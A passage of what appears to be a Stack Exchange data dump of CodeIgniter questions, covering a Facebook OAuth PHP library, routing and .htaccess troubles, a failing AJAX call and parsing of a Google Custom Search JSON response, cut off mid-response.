{\n            $post .= \"{$k}={$v}&amp;\";\n        }\n\n        $post = substr($post, 0, -1);\n\n        $this-&gt;_initConnection($url, $params);\n        curl_setopt($this-&gt;_ch, CURLOPT_POST, 1);\n        curl_setopt($this-&gt;_ch, CURLOPT_POSTFIELDS, $post);\n\n        $response = $this-&gt;_addCurl($url, $params);\n\n        return $response;\n    }\n\n    private function _addCurl($url, $params = array())\n    {\n        $ch = $this-&gt;_ch;\n\n        $key = (string) $ch;\n        $this-&gt;_requests[$key] = $ch;\n\n        $response = curl_multi_add_handle($this-&gt;_mch, $ch);\n\n        if ( $response === CURLM_OK || $response === CURLM_CALL_MULTI_PERFORM )\n        {\n            do {\n                $mch = curl_multi_exec($this-&gt;_mch, $active);\n            } while ( $mch === CURLM_CALL_MULTI_PERFORM );\n\n            return $this-&gt;_getResponse($key);\n        }\n        else\n        {\n            return $response;\n        }\n    }\n\n    private function _getResponse($key = NULL)\n    {\n        if ( $key == NULL ) return FALSE;\n\n        if ( isset($this-&gt;_responses[$key]) )\n        {\n            return $this-&gt;_responses[$key];\n        }\n\n        $running = NULL;\n\n        do\n        {\n            $response = curl_multi_exec($this-&gt;_mch, $running_curl);\n\n            if ( $running !== NULL &amp;&amp; $running_curl != $running )\n            {\n                $this-&gt;_setResponse($key);\n\n                if ( isset($this-&gt;_responses[$key]) )\n                {\n                    $response = new facebookResponse( (object) $this-&gt;_responses[$key] );\n\n                    if ( $response-&gt;__resp-&gt;code !== 200 )\n                    {\n                        $error = $response-&gt;__resp-&gt;code.' | Request Failed';\n\n                        if ( isset($response-&gt;__resp-&gt;data-&gt;error-&gt;type) )\n                        {\n                            $error .= ' - '.$response-&gt;__resp-&gt;data-&gt;error-&gt;type.' - '.$response-&gt;__resp-&gt;data-&gt;error-&gt;message;\n                        }\n\n                        throw new facebookException($error);\n                    }\n\n                    return $response;\n                }\n            }\n\n            $running = $running_curl;\n\n        } while ( $running_curl &gt; 0);\n\n    }\n\n    private function _setResponse($key)\n    {\n        while( $done = curl_multi_info_read($this-&gt;_mch) )\n        {\n            $key = (string) $done['handle'];\n            $this-&gt;_responses[$key]['data'] = curl_multi_getcontent($done['handle']);\n\n            foreach ( $this-&gt;_properties as $curl_key =&gt; $value )\n            {\n                $this-&gt;_responses[$key][$curl_key] = curl_getinfo($done['handle'], $value);\n\n                curl_multi_remove_handle($this-&gt;_mch, $done['handle']);\n            }\n      }\n    }\n}\n\nclass facebookResponse {\n\n    private $__construct;\n\n    public function __construct($resp)\n    {\n        $this-&gt;__resp = $resp;\n\n        $data = json_decode($this-&gt;__resp-&gt;data);\n\n        if ( $data !== NULL )\n        {\n            $this-&gt;__resp-&gt;data = $data;\n        }\n    }\n\n    public function __get($name)\n    {\n        if ($this-&gt;__resp-&gt;code &lt; 200 || $this-&gt;__resp-&gt;code &gt; 299) return FALSE;\n\n        $result = array();\n\n        if ( is_string($this-&gt;__resp-&gt;data ) )\n        {\n            parse_str($this-&gt;__resp-&gt;data, $result);\n            $this-&gt;__resp-&gt;data = (object) $result;\n        }\n\n        if ( $name === '_result')\n        {\n            return $this-&gt;__resp-&gt;data;\n        }\n\n        return $this-&gt;__resp-&gt;data-&gt;$name;\n    }\n}\n\nclass facebookException extends Exception {\n\n    function __construct($string)\n    {\n        parent::__construct($string);\n    }\n\n    public function __toString() {\n        return \"exception '\".__CLASS__ .\"' with message '\".$this-&gt;getMessage().\"' in \".$this-&gt;getFile().\":\".$this-&gt;getLine().\"\\nStack trace:\\n\".$this-&gt;getTraceAsString();\n    }\n}\n\nclass facebookSession {\n\n    private $_api_key;\n    private $_api_secret;\n    private $_token_url     = 'oauth/access_token';\n    private $_user_url      = 'me';\n    private $_data          = array();\n\n    function __construct()\n    {\n        $this-&gt;_obj =$CI =&amp; get_instance();\n\n        $fb_api_id     = $CI-&gt;db-&gt;get_where('settings', array('code' =&gt; 'SITE_FB_API_ID'))-&gt;row()-&gt;string_value;\n        $fb_api_secret = $CI-&gt;db-&gt;get_where('settings', array('code' =&gt; 'SITE_FB_API_SECRET'))-&gt;row()-&gt;string_value;\n\n        $this-&gt;_api_key     = $fb_api_id;\n        $this-&gt;_api_secret  = $fb_api_secret;\n\n        $this-&gt;_token_url   = $this-&gt;_obj-&gt;config-&gt;item('facebook_api_url').$this-&gt;_token_url;\n        $this-&gt;_user_url    = $this-&gt;_obj-&gt;config-&gt;item('facebook_api_url').$this-&gt;_user_url;\n\n        $this-&gt;_set('scope', $this-&gt;_obj-&gt;config-&gt;item('facebook_default_scope'));\n\n        $this-&gt;connection = new facebookConnection();\n\n        if ( !$this-&gt;logged_in() )\n        {\n             // Initializes the callback to this page URL.\n            $this-&gt;set_callback();\n        }\n\n    }\n\n    public function logged_in()\n    {\n        return ( $this-&gt;get() === NULL ) ? FALSE : TRUE;\n    }\n\n    public function logout()\n    {\n        $this-&gt;_unset('token');\n        $this-&gt;_unset('user');\n    }\n\n    public function login_url($scope = NULL)\n    {\n        $url = \"http://www.facebook.com/dialog/oauth?client_id=\".$this-&gt;_api_key.'&amp;redirect_uri='.urlencode($this-&gt;_get('callback'));\n\n        if ( empty($scope) )\n        {\n            $scope = $this-&gt;_get('scope');\n        }\n        else\n        {\n            $this-&gt;_set('scope', $scope);\n        }\n\n        if ( !empty($scope) )\n        {\n            $url .= '&amp;scope='.$scope;\n        }\n\n        return $url;\n    }\n\n    public function login($scope = NULL)\n    {\n        $this-&gt;logout();\n\n        if ( !$this-&gt;_get('callback') ) $this-&gt;_set('callback', current_url());\n\n        $url = $this-&gt;login_url($scope);\n\n        return redirect($url);\n    }\n\n    public function get()\n    {\n        $token = $this-&gt;_find_token();\n        if ( empty($token) ) return NULL;\n\n        // $user = $this-&gt;_get('user');\n        // if ( !empty($user) ) return $user;\n\n        try \n        {\n            $user = $this-&gt;connection-&gt;get($this-&gt;_user_url.'?'.$this-&gt;_token_string());\n        }\n        catch ( facebookException $e )\n        {\n            $this-&gt;logout();\n            return NULL;\n        }\n\n        // $this-&gt;_set('user', $user);\n        return $user;\n    }\n\n    private function _find_token()\n    {\n        $token = $this-&gt;_get('token');\n\n        if ( !empty($token) )\n        {\n            if ( !empty($token-&gt;expires) &amp;&amp; intval($token-&gt;expires) &gt;= time() )\n            {\n                // Problem, token is expired!\n                return $this-&gt;logout();\n            }\n\n            $this-&gt;_set('token', $token);\n            return $this-&gt;_token_string();\n        }\n\n        if ( !isset($_GET['code']) )\n        {\n            return $this-&gt;logout();\n        }\n\n        if ( !$this-&gt;_get('callback') ) $this-&gt;_set('callback', current_url());\n        $token_url = $this-&gt;_token_url.'?client_id='.$this-&gt;_api_key.\"&amp;client_secret=\".$this-&gt;_api_secret.\"&amp;code=\".$_GET['code'].'&amp;redirect_uri='.urlencode($this-&gt;_get('callback'));\n\n        try \n        {\n            $token = $this-&gt;connection-&gt;get($token_url);\n        }\n        catch ( facebookException $e )\n        {\n            $this-&gt;logout();\n            redirect($this-&gt;_strip_query());\n            return NULL;\n        }\n\n        $this-&gt;_unset('callback');\n\n        if ( $token['access_token'] )\n        {\n            if ( !empty($token-&gt;expires) )\n            {\n                $token-&gt;expires = strval(time() + intval($token-&gt;expires));\n            }\n\n            $this-&gt;_set('token', $token);\n            redirect($this-&gt;_strip_query());\n        }\n\n        return $this-&gt;_token_string();\n    }\n\n    private function _get($key)\n    {\n        $key = '_facebook_'.$key;\n        return $this-&gt;_obj-&gt;session-&gt;userdata($key);\n    }\n\n    private function _set($key, $data)\n    {\n        $key = '_facebook_'.$key;\n        $this-&gt;_obj-&gt;session-&gt;set_userdata($key, $data);\n    }\n\n    private function _unset($key)\n    {\n        $key = '_facebook_'.$key;\n        $this-&gt;_obj-&gt;session-&gt;unset_userdata($key);\n    }\n\n    public function set_callback($url = NULL)\n    {\n        $this-&gt;_set('callback', $this-&gt;_strip_query($url));\n    }\n\n    private function _token_string()\n    {\n        return 'access_token='.$this-&gt;_get('token')-&gt;access_token;\n    }\n\n    public function append_token($url)\n    {\n        if ( $this-&gt;_get('token') ) $url .= '?'.$this-&gt;_token_string();\n\n        return $url;\n    }\n\n    private function _strip_query($url = NULL)\n    {\n        if ( $url === NULL )\n        {\n            $url = ( empty($_SERVER['HTTPS']) ) ? 'http' : 'https';\n            $url .= '://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];\n        }\n\n        $parts = explode('?', $url);\n        return $parts[0];\n    }\n}\n</code></pre>\n"},{"tags":["php","jquery","html","css","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":49,"score":1,"question_id":13264787,"title":"Codeigniter issue","body":"<p><strong>Controller</strong></p>\n\n<pre><code>class Welcome extends CI_Controller\n{\n    public function index()\n    {   \n        $this-&gt;load-&gt;helper('url'); \n        $this-&gt;load-&gt;view('welcome_message');\n        $this-&gt;load-&gt;model('Home_model');\n        $data['query'] = $this-&gt;Home_model-&gt;getcategory(); \n        $this-&gt;load-&gt;view('userheader', $data); \n    }\n}\n</code></pre>\n\n<p><strong>Model</strong></p>\n\n<pre><code>class Home_model extends CI_Model\n{\n    public function getcategory()\n    {           \n        $this-&gt;db-&gt;select('id, cat_value, cat_title','isactive');\n        $query = $this-&gt;db-&gt;get('js_job_categories');\n        return $query-&gt;result();\n    }\n}\n</code></pre>\n\n<p><strong>Views</strong></p>\n\n<p>I include the header and footer \nsame content displaying again below footer</p>\n\n<p>In top of the header it does not display the query result\nhow can solve the problem..</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":13276140,"title":"Make Codeigniter 2.1.3 allow a Facebook backlink","body":"<p>It happens that I need to fix a Codeigniter issue urgently while being in no way familiar with the tool.</p>\n\n<p>Simple question: how do I allow <strong>links back from Facebook</strong> like <a href=\"http://www.xxx.de/?fb_action_ids=4811819099741&amp;fb_action_types=og.likes&amp;fb_source=timeline_og&amp;action_object_map=%7B%224811819099741%22%3A447766801925104%7D&amp;action_type_map=%7B%224811819099741%22%3A%22og.likes%22%7D&amp;action_ref_map=%5B%5D\" rel=\"nofollow\">http://www.xxx.de/?fb_action_ids=4811819099741&amp;fb_action_types=og.likes&amp;fb_source=timeline_og&amp;action_object_map=%7B%224811819099741%22%3A447766801925104%7D&amp;action_type_map=%7B%224811819099741%22%3A%22og.likes%22%7D&amp;action_ref_map=%5B%5D</a></p>\n\n<p>without creating either the infamous <em>The URI you submitted has disallowed characters</em> - which I can fix by setting $config['permitted_uri_chars'] - and neither a 404 because of the internal redirects of CI.</p>\n\n<p>I'd love to learn of a quick fix for that issue.</p>\n"},{"tags":[".htaccess","codeigniter","apache2","ubuntu-12.04"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":31,"score":1,"question_id":13275555,"title":"htaccess and httpd.conf configuraion to enable codeigniter working on ubuntu 12.04","body":"<p>I have installed ubuntu 12.04 and I have complete requirements(apache,mysql and php5) for running php projects. Projects which are not in codeigniter are working well. Within codeigniter , when I load the project  the default controller loads the index_view but when I click to other controllers; they  wont work with error  and display error</p>\n\n<h2>Not Found The requested URL /academic/login was not found on this server.</h2>\n\n<p>I realized that the .htaccess wont work; then the /etc/apache2/httpd.conf file is empty\n I would like to request a sample of basic configuration of httpd.conf file so that my htaccess file can work. If any suggestion that can help me to arrive at some results would be appreciated. Thanks.\n My httaccess is given below\n</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\n\n### Canonicalize codeigniter URLs\n\n# If your default controller is something other than\n# \"welcome\" you should probably change this\nRewriteRule ^(platform(/index)?)/?$ / [L,R=301]\nRewriteRule ^(.*)/index/?$ $1 [L,R=301]\n\n# Removes trailing slashes (prevents SEO duplicate content issues)\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.+)/$ $1 [L,R=301]\n\n# Enforce www\n# If you have subdomains, you can add them to\n# the list using the \"|\" (OR) regex operator\nRewriteCond %{HTTP_HOST} !^(localhost|academic) [NC]\nRewriteRule ^(.*)$ http://localhost/academic/$1 [L,R=301]\n\n# Enforce NO www\n#RewriteCond %{HTTP_HOST} ^www [NC]\n#RewriteRule ^(.*)$ http://domain.tld/$1 [L,R=301]\n\n###\n\n# Removes access to the system folder by users.\n# Additionally this will allow you to create a System.php controller,\n# previously this would not have been possible.\n# 'system' can be replaced if you have renamed your system folder.\nRewriteCond %{REQUEST_URI} ^system.*\nRewriteRule ^(.*)$ /index.php/$1 [L]\n\n# Checks to see if the user is attempting to access a valid file,\n# such as an image or css document, if this isn't true it sends the\n# request to index.php\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php/$1 [L]\n</code></pre>\n\n<p></p>\n\n<p></p>\n\n<pre><code># Without mod_rewrite, route 404's to the front controller\nErrorDocument 404 /index.php\n</code></pre>\n\n<p></p>\n"},{"tags":["jquery","ajax","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":35,"score":2,"question_id":13236664,"title":"ajax not working in codeigniter","body":"<p>I'm trying to send a post request using the ajax jquery function and return some data into a window asynchronously. Here's what I have so far. It doesn't seem to be working.</p>\n\n<p>in the view:</p>\n\n<pre><code>$.ajax({\n          url: '/dashboard/presskits/media/get_video_link/',\n          type: 'POST',\n          dataType: 'json',\n          data: { encoded_link : encoded_link },\n          cache: false,\n          success: function(output_string){\n            // $('#edit_video_info').append(output_string);\n            alert(output_string.url_data);\n          } // End of success function of ajax form\n          }); // End of ajax call\n}); \n</code></pre>\n\n<p>in the controller:</p>\n\n<pre><code> public function get_video_link()\n{\n    $temp_url = $this-&gt;input-&gt;post('encoded_link');\n    $output_string = json_encode(array('url_data' =&gt; $temp_url));\n            return $output_string;\n    } \n</code></pre>\n"},{"tags":["php","codeigniter","google-custom-search"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":13267009,"title":"Get data from Google Custom Search Api in PHP","body":"<p>this is the response i am getting from google custom search api</p>\n\n<p>i want to to insert TITLE of website, url and other information in my Database directly.</p>\n\n<p>i use json_decode but seems unable to get the response</p>\n\n<p>Please help me guys</p>\n\n<pre><code>    {\n\"kind\": \"customsearch#search\",\n\"url\": {\n    \"type\": \"application/json\",\n    \"template\": \"https://www.googleapis.com/customsearch/v1?q={searchTerms}&amp;num={count?}&amp;start={startIndex?}&amp;lr={language?}&amp;safe={safe?}&amp;cx={cx?}&amp;cref={cref?}&amp;sort={sort?}&amp;filter={filter?}&amp;gl={gl?}&amp;cr={cr?}&amp;googlehost={googleHost?}&amp;c2coff={disableCnTwTranslation?}&amp;hq={hq?}&amp;hl={hl?}&amp;siteSearch={siteSearch?}&amp;siteSearchFilter={siteSearchFilter?}&amp;exactTerms={exactTerms?}&amp;excludeTerms={excludeTerms?}&amp;linkSite={linkSite?}&amp;orTerms={orTerms?}&amp;relatedSite={relatedSite?}&amp;dateRestrict={dateRestrict?}&amp;lowRange={lowRange?}&amp;highRange={highRange?}&amp;searchType={searchType}&amp;fileType={fileType?}&amp;rights={rights?}&amp;imgSize={imgSize?}&amp;imgType={imgType?}&amp;imgColorType={imgColorType?}&amp;imgDominantColor={imgDominantColor?}&amp;alt=json\"\n},\n\"queries\": {\n    \"nextPage\": [\n        {\n            \"title\": \"Google Custom Search - online shopping mall\",\n            \"totalResults\": \"35200000\",\n            \"searchTerms\": \"online shopping mall\",\n            \"count\": 10,\n            \"startIndex\": 11,\n            \"inputEncoding\": \"utf8\",\n            \"outputEncoding\": \"utf8\",\n            \"safe\": \"off\",\n            \"cx\": \"013036536707430787589:_pqjad5hr1a\"\n        }\n    ],\n    \"request\": [\n        {\n            \"title\": \"Google Custom Search - online shopping mall\",\n            \"totalResults\": \"35200000\",\n            \"searchTerms\": \"online shopping mall\",\n            \"count\": 10,\n            \"startIndex\": 1,\n            \"inputEncoding\": \"utf8\",\n            \"outputEncoding\": \"utf8\",\n            \"safe\": \"off\",\n            \"cx\": \"013036536707430787589:_pqjad5hr1a\"\n        }\n    ]\n},\n\"context\": {\n    \"title\": \"Custom Search\"\n},\n\"searchInformation\": {\n    \"searchTime\": 0.324098,\n    \"formattedSearchTime\": \"0.32\",\n    \"totalResults\": \"35200000\",\n    \"formattedTotalResults\": \"35,200,000\"\n},\n\"items\": [\n    {\n        \"kind\": \"customsearch#result\",\n        \"title\": \"Online Shopping Mall-Shopping &amp; Business Social Network\",\n        \"htmlTitle\": \"&lt;b&gt;Online Shopping Mall&lt;/b&gt;-Shopping &amp;amp; Business Social Network\",\n        \"link\": \"http://onlineshoppingmall.ning.com/\",\n        \"displayLink\": \"onlineshoppingmall.ning.com\",\n        \"snippet\": \"A One-Stop shopping &amp; business social network created by a family of merchants   offering value, unique treasures, and convenience!\",\n        \"htmlSnippet\": \"A One-Stop &lt;b&gt;shopping&lt;/b&gt; &amp;amp; business social network created by a family of merchants &lt;br&gt;  offering value, unique treasures, and convenience!\",\n        \"cacheId\": \"5uXNYD4cCQ0J\",\n        \"formattedUrl\": \"onlineshoppingmall.ning.com/\",\n        \"htmlFormattedUrl\": \"&lt;b&gt;onlineshoppingmall&lt;/b&gt;.ning.com/\",\n        \"pagemap\": {\n            \"cse_image\": [\n                {\n                    \"src\": \"http://i43.tinypic.com/15wm45e.jpg\"\n                }\n            ],\n            \"cse_thumbnail\": [\n                {\n                    \"width\": \"100\",\n                    \"height\": \"100\",\n                    \"src\": \"https://encrypted-tbn3.gstatic.com/images?q=tbn:ANd9GcQy2PZIPYcAjBAPOYgKgqnWfb9kJLCW4Xx7_QZcdRmfP_MeGPH9HZNnlA\"\n                }\n            ],\n            \"metatags\": [\n                {\n                    \"title\": \"Online Shopping Mall-Shopping &amp; Business Social Network\"\n                }\n            ]\n        }\n    },\n    {\n        \"kind\": \"customsearch#result\",\n        \"title\": \"Online shopping malls - Wikipedia, the free encyclopedia\",\n        \"htmlTitle\": \"&lt;b&gt;Online shopping malls&lt;/b&gt; - Wikipedia, the free encyclopedia\",\n        \"link\": \"http://en.wikipedia.org/wiki/Online_shopping_malls\",\n        \"displayLink\": \"en.wikipedia.org\",\n        \"snippet\": \"Online shopping malls are websites that have a directory of online shopping   stores. Stores may include Best Buy, Aeropostale, Home Depot, Sears, Expedia, ...\",\n        \"htmlSnippet\": \"&lt;b&gt;Online shopping malls&lt;/b&gt; are websites that have a directory of online shopping &lt;br&gt;  stores. Stores may include Best Buy, Aeropostale, Home Depot, Sears, Expedia, &lt;b&gt;...&lt;/b&gt;\",\n        \"cacheId\": \"dA73fRSS6KMJ\",\n        \"formattedUrl\": \"en.wikipedia.org/wiki/Online_shopping_malls\",\n        \"htmlFormattedUrl\": \"en.wikipedia.org/wiki/&lt;b&gt;Online&lt;/b&gt;_&lt;b&gt;shopping&lt;/b&gt;_&lt;b&gt;malls&lt;/b&gt;\"\n    },\n    {\n        \"kind\": \"customsearch#result\",\n        \"title\": \"Shop for Home, Outdoor, Electronics and Apparel Products at ...\",\n        \"htmlTitle\": \"&lt;b&gt;Shop&lt;/b&gt; for Home, Outdoor, Electronics and Apparel Products at &lt;b&gt;...&lt;/b&gt;\",\n        \"link\": \"http://www.skymall.com/\",\n        \"displayLink\": \"www.skymall.com\",\n        \"snippet\": \"SkyMall shopping magazine is your home for the best online catalog shopping!   Browse from home living, décor, audio, ipod, electronics and apparel. Purchase ...\",\n        \"htmlSnippet\": \"SkyMall &lt;b&gt;shopping&lt;/b&gt; magazine is your home for the best &lt;b&gt;online&lt;/b&gt; catalog &lt;b&gt;shopping&lt;/b&gt;! &lt;br&gt;  Browse from home living, décor, audio, ipod, electronics and apparel. Purchase &lt;b&gt;...&lt;/b&gt;\",\n        \"cacheId\": \"GWXI7WmQ2UUJ\",\n        \"formattedUrl\": \"www.skymall.com/\",\n        \"htmlFormattedUrl\": \"www.sky&lt;b&gt;mall&lt;/b&gt;.com/\",\n        \"pagemap\": {\n            \"cse_image\": [\n                {\n                    \"src\": \"http://www.skymall.com/images/feature_a1a.jpg\"\n                }\n            ],\n            \"cse_thumbnail\": [\n                {\n                    \"width\": \"239\",\n                    \"height\": \"210\",\n                    \"src\": \"https://encrypted-tbn3.gstatic.com/images?q=tbn:ANd9GcTljZ4YcdN7ZRJlVMeTlYF8sbuwLm0VRhg0oZnLDX1elV3j-dmO22t68do\"\n                }\n            ],\n            \"metatags\": [\n                {\n                    \"copyright\": \"Copyright © 2012 SkyMall, Inc. All right reserved.\",\n                    \"designer\": \"www.objectinnovation.com\",\n                    \"classification\": \"online shopping, shopping, gifts, catalog sales\"\n                }\n            ]\n        }\n    },\n    {\n        \"kind\": \"customsearch#result\",\n        \"title\": \"Sassy Shops, Your Premiere Online Mall for All Things Fabulous!\",\n        \"htmlTitle\": \"Sassy &lt;b&gt;Shops&lt;/b&gt;, Your Premiere &lt;b&gt;Online Mall&lt;/b&gt; for All Things Fabulous!\",\n        \"link\": \"http://www.sassyshops.com/\",\n        \"displayLink\": \"www.sassyshops.com\",\n        \"snippet\": \"Sassy Shops, Your Premiere Online Mall for All Things Fabulous! Throw on some   comfy pj's, grab a cup of hot cocoa or java and enjoy shopping from the ...\",\n        \"htmlSnippet\": \"Sassy &lt;b&gt;Shops&lt;/b&gt;, Your Premiere &lt;b&gt;Online Mall&lt;/b&gt; for All Things Fabulous! Throw on some &lt;br&gt;  comfy pj&amp;#39;s, grab a cup of hot cocoa or java and enjoy &lt;b&gt;shopping&lt;/b&gt; from the &lt;b&gt;...&lt;/b&gt;\",\n        \"cacheId\": \"jaAQALpU96oJ\",\n        \"formattedUrl\": \"www.sassyshops.com/\",\n        \"htmlFormattedUrl\": \"www.sassy&lt;b&gt;shops&lt;/b&gt;.com/\",\n        \"pagemap\": {\n            \"cse_image\": [\n                {\n                    \"src\": \"http://sassyshops.com/images/pinkbug/headerlogo.gif\"\n                }\n            ],\n            \"cse_thumbnail\": [\n                {\n                    \"width\": \"268\",\n                    \"height\": \"188\",\n                    \"src\": \"https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcQ4-X6hJVkuF_fFclW9e8IXDKtqXJ-JTF64QwI4xfTawHkMsnsOAuGCXsQv\"\n                }\n            ]\n        }\n    },\n    {\n        \"kind\": \"customsearch#result\",\n        \"title\": \"Home Page - Shop Online at MileagePlus Shopping\",\n        \"htmlTitle\": \"Home Page - &lt;b&gt;Shop Online&lt;/b&gt; at MileagePlus &lt;b&gt;Shopping&lt;/b&gt;\",\n        \"link\": \"https://www.mileageplusshopping.com/\",\n        \"displayLink\": \"www.mileageplusshopping.com\",\n        \"snippet\": \"Home Page - Shop Online at MileagePlus Shopping.\",\n        \"htmlSnippet\": \"Home Page - &lt;b&gt;Shop Online&lt;/b&gt; at MileagePlus &lt;b&gt;Shopping&lt;/b&gt;.\",\n        \"formattedUrl\": \"https://www.mileageplusshopping.com/\",\n        \"htmlFormattedUrl\": \"https://www.mileageplus&lt;b&gt;shopping&lt;/b&gt;.com/\",\n        \"pagemap\": {\n            \"cse_image\": [\n                {\n                    \"src\": \"https://a248.e.akamai.net/f/248/35975/5d/i.mallnetworks.com/images/global/40cf5e879cc6088d7d2086a512fd79b19b0aaa2a.jpg\"\n                }\n            ],\n            \"cse_thumbnail\": [\n                {\n                    \"width\": \"96\",\n                    \"height\": \"72\",\n                    \"src\": \"https://encrypted-tbn2.gstatic.com/images?q=tbn:ANd9GcSDE8da0POrgf12M_3zBGdueaQfT0AHYBbz7Dkxnm7QQbHUegSwMEPleg\"\n                }\n            ]\n        }\n    },\n    {\n        \"kind\": \"customsearch#result\",\n        \"title\": \"We-Care.com Online Shopping Mall :: Shop With Purpose :: Macy's ...\",\n        \"htmlTitle\": \"We-Care.com &lt;b&gt;Online Shopping Mall&lt;/b&gt; :: Shop With Purpose :: Macy&amp;#39;s &lt;b&gt;...&lt;/b&gt;\",\n        \"link\": \"http://www.we-care.com/\",\n        \"displayLink\": \"www.we-care.com\",\n        \"snippet\": \"The online shopping mall that provides coupons for your favorite merchants and   donates a percentage of what you spend to your favorite nonprofit, school, ...\",\n        \"htmlSnippet\": \"The &lt;b&gt;online shopping mall&lt;/b&gt; that provides coupons for your favorite merchants and &lt;br&gt;  donates a percentage of what you spend to your favorite nonprofit, school, &lt;b&gt;...&lt;/b&gt;\",\n        \"cacheId\": \"RgiiDvqLcscJ\",\n        \"formattedUrl\": \"www.we-care.com/\",\n        \"htmlFormattedUrl\": \"www.we-care.com/\",\n        \"pagemap\": {\n            \"cse_image\": [\n                {\n                    \"src\": \"http://cdn.we-care.com/Content/images/addCause.gif\"\n                }\n            ],\n            \"cse_thumbnail\": [\n                {\n                    \"width\": \"249\",\n                    \"height\": \"100\",\n                    \"src\": \"https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcQoOFWkNEJQDtz21dtLqwegJiXYruxvZ8UFLaFWH27knH2sIYqfvmPZOg\"\n                }\n            ]\n        }\n    },\n    {\n        \"kind\": \"customsearch#result\",\n        \"title\": \"Online Shopping vs. Driving to the Mall: The Greener Way to Buy ...\",\n        \"htmlTitle\": \"&lt;b&gt;Online Shopping&lt;/b&gt; vs. Driving to the &lt;b&gt;Mall&lt;/b&gt;: The Greener Way to Buy &lt;b&gt;...&lt;/b&gt;\",\n        \"link\": \"http://www.treehugger.com/culture/online-shopping-vs-driving-to-the-mall-the-greener-way-to-buy.html\",\n        \"displayLink\": \"www.treehugger.com\",\n        \"snippet\": \"Feb 13, 2009 ... When it comes to the way we procure the goods we use in our lives, there are   some mixed messages out there. Buying local is advertised as a ...\",\n        \"htmlSnippet\": \"Feb 13, 2009 &lt;b&gt;...&lt;/b&gt; When it comes to the way we procure the goods we use in our lives, there are &lt;br&gt;  some mixed messages out there. Buying local is advertised as a &lt;b&gt;...&lt;/b&gt;\",\n        \"cacheId\": \"9gBcwLGsuq8J\",\n        \"formattedUrl\": \"www.treehugger.com/.../online-shopping-vs-driving-to-the-mall-the-greener- way-to-buy.html\",\n        \"htmlFormattedUrl\": \"www.treehugger.com/.../&lt;b&gt;online&lt;/b&gt;-&lt;b&gt;shopping&lt;/b&gt;-vs-driving-to-the-&lt;b&gt;mall&lt;/b&gt;-the-greener- way-to-buy.html\",\n        \"pagemap\": {\n            \"cse_image\": [\n                {\n                    \"src\": \"http://media.treehugger.com/assets/images/2011/10/shopping-mall-online-shopping-which-greener.jpg.400x300_q90_crop-smart.jpg\"\n                }\n            ],\n            \"cse_thumbnail\": [\n                {\n                    \"width\": \"259\",\n                    \"height\": \"194\",\n                    \"src\": \"https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcRQ2PXb8tGbfICgwAmSS9m1XtEq117PujeITme8mBELX6zW3JfzgGVHEYw\"\n                }\n            ],\n            \"metatags\": [\n                {\n                    \"og:title\": \"Online Shopping vs. Driving to the Mall: The Greener Way to Buy\",\n                    \"og:type\": \"article\",\n                    \"og:url\": \"http://www.treehugger.com/culture/online-shopping-vs-driving-to-the-mall-the-greener-way-to-buy.html\",\n                    \"og:image\": \"http://media.treehugger.com/assets/images/2011/10/shopping-mall-online-shopping-which-greener.jpg.400x300_q90_crop-smart.jpg\",\n                    \"og:site_name\": \"TreeHugger\",\n                    \"og:description\": \"When it comes to the way we procure the goods we use in our lives, there are some mixed messages out there. Buying local is advertised as a green way to go -- and it can be -- but so is acquiring\",\n                    \"fb:app_id\": \"133255656700169\"\n                }\n            ]\n        }\n    },\n    {\n        \"kind\": \"customsearch#result\",\n        \"title\": \"Shabby Lane Shops - Great online Shopping Mall &amp; Unique Web ...\",\n        \"htmlTitle\": \"Shabby Lane Shops - Great &lt;b&gt;online Shopping Mall&lt;/b&gt; &amp;amp; Unique Web &lt;b&gt;...&lt;/b&gt;\",\n        \"link\": \"http://shabbylaneshops.com/\",\n        \"displayLink\": \"shabbylaneshops.com\",\n        \"snippet\": \"Shabby Lane Shops Great online shopping mall and Web design. Let us   advertise for you. Come shop with us, come join us.\",\n        \"htmlSnippet\": \"Shabby Lane Shops Great &lt;b&gt;online shopping mall&lt;/b&gt; and Web design. Let us &lt;br&gt;  advertise for you. Come shop with us, come join us.\",\n        \"cacheId\": \"FhVJ8g2L5i8J\",\n        \"formattedUrl\": \"shabbylaneshops.com/\",\n        \"htmlFormattedUrl\": \"shabbylane&lt;b&gt;shops&lt;/b&gt;.com/\"\n    },\n    {\n        \"kind\": \"customsearch#result\",\n        \"title\": \"Online Shopping Malls, Discount Stores, Outlet Malls, Shopping ...\",\n        \"htmlTitle\": \"&lt;b&gt;Online Shopping Malls&lt;/b&gt;, Discount Stores, Outlet Malls, Shopping &lt;b&gt;...&lt;/b&gt;\",\n        \"link\": \"http://www.milehimall.com/\",\n        \"displayLink\": \"www.milehimall.com\",\n        \"snippet\": \"Shop at online shopping malls, discount stores and gift shops at Mile Hi Mall.   Browse home and garden, beauty, electronics, sporting goods, jewelry and ...\",\n        \"htmlSnippet\": \"Shop at &lt;b&gt;online shopping malls&lt;/b&gt;, discount stores and gift shops at Mile Hi Mall. &lt;br&gt;  Browse home and garden, beauty, electronics, sporting goods, jewelry and &lt;b&gt;...&lt;/b&gt;\",\n        \"cacheId\": \"PaF59OCuEJ4J\",\n        \"formattedUrl\": \"www.milehimall.com/\",\n        \"htmlFormattedUrl\": \"www.milehi&lt;b&gt;mall&lt;/b&gt;.com/\",\n        \"pagemap\": {\n            \"cse_image\": [\n                {\n                    \"src\": \"http://www.shareasale.com/image/27020/child-costumes125x125.jpg\"\n                }\n            ],\n            \"cse_thumbnail\": [\n                {\n                    \"width\": \"100\",\n                    \"height\": \"100\",\n                    \"src\": 